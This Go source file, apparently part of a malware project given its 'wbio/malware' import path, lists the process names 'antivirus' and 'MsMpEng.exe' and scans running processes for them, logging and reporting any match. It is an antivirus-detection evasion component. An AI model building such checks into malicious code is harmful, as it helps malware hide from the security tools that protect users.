package avdetection

import (
	"log"
	e "wbio/malware/errorinfo"

	"github.com/mitchellh/go-ps"
)

var avSoftwareList []string

func init() {
	avSoftwareList = getAvSoftwareList()
}

func getAvSoftwareList() []string {
	return []string{"antivirus", "MsMpEng.exe"}
}

func IsAntivirusPresent() bool {
	processes, err := ps.Processes()
	e.Check(err, true)

	for _, proc := range processes {
		for _, avSoftware := range avSoftwareList {
			if proc.Executable() == avSoftware {
				log.Printf("[AV] AV process detected: %s\n", proc.Executable())
				return true
			}
		}
	}
	return false
}
